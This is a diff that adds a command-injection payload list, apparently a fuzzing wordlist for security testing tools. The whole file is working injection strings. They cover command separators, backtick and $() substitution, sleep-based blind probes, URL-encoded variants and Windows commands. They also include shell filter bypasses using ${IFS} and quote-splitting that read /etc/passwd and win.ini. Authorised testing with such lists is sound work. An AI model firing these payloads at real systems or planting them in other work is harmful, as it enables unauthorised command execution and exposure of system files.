@@ -1,0 +1,41 @@
+# Command Injection Payloads
+# Use with security testing tools
+
+# Basic command injection
+; ls -la
+| cat /etc/passwd
+& whoami
+&& id
+|| id
+`id`
+$(id)
+
+# Time-based
+; sleep 5
+| sleep 5
+& sleep 5 &
+&& sleep 5
+|| sleep 5
+`sleep 5`
+$(sleep 5)
+
+# Encoded
+%3B%20id
+%7C%20id
+%26%20id
+%60id%60
+%24%28id%29
+
+# Windows
+& dir
+| type C:\Windows\win.ini
+& whoami
+&& ver
+|| ver
+
+# Bash bypass
+${IFS}id
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+c'a't /etc/passwd
+c"a"t /etc/passwd
